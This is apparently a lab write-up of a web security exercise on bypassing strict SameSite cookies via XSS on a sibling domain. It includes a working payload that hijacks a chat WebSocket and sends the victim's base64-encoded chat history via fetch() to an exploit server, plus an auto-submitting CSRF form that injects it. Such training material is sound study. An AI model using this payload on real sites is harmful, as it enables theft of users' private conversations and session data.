# Strict Same-Site bypass via sibling domain XSS

A website has “live chat feature”.

No CSRF token is used when upgrading to WS, that means it’s vulnerable to CSRF. If the Same-Site restriction could be bypassed, it means it can be exploited to steal user chat history.

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image.png)

When READY sent to websocket server, it responds with a hull history

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image%201.png)

Request to chat.js file discloses a sibling domain in Access-Control-Allow-Origin header:

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image%202.png)

When checking a sibling domain, it’s easy to notice it’s vulnerable to XSS:

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image%203.png)

So the strategy is to use XSS to send a request to a Websocket server (the request will include a session of a target user, because the website are effectively Same-Site), and after receiving a response, send the base64-encoded data to our server and read the contents.

The payload:

```bash
let newWebSocket = new WebSocket("wss://0a4e00ec0326608a80b503c1005c008d.web-security-academy.net/chat");
         newWebSocket.onopen = function (evt) {             newWebSocket.send("READY");         }
         newWebSocket.onmessage = function (evt) {             var message = evt.data;             fetch("https://exploit-0a88000f0350607080d0021101450074.exploit-server.net/exploit?message=" +                 btoa(message)             )         }
```

To execute it, we must URL-encode and pass to the victim using XSS.

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://cms-0a4e00ec0326608a80b503c1005c008d.web-security-academy.net/login" method="POST">
      <input type="hidden" name="username" value="&lt;script&gt;let&#32;newWebSocket&#32;&#61;&#32;new&#32;WebSocket&#40;&quot;wss&#58;&#47;&#47;0a4e00ec0326608a80b503c1005c008d&#46;web&#45;security&#45;academy&#46;net&#47;chat&quot;&#41;&#59;&#13;&#10;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;newWebSocket&#46;onopen&#32;&#61;&#32;function&#32;&#40;evt&#41;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;newWebSocket&#46;send&#40;&quot;READY&quot;&#41;&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#13;&#10;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;newWebSocket&#46;onmessage&#32;&#61;&#32;function&#32;&#40;evt&#41;&#32;&#123;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;var&#32;message&#32;&#61;&#32;evt&#46;data&#59;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;fetch&#40;&quot;https&#58;&#47;&#47;exploit&#45;0a88000f0350607080d0021101450074&#46;exploit&#45;server&#46;net&#47;exploit&#63;message&#61;&quot;&#32;&#43;&#32;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;btoa&#40;message&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#41;&#13;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&lt;&#47;script&gt;" />
      <input type="hidden" name="password" value="123" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image%204.png)

![image.png](Strict%20Same-Site%20bypass%20via%20sibling%20domain%20XSS%201e0021737a898035a117c4bee93fcafb/image%205.png)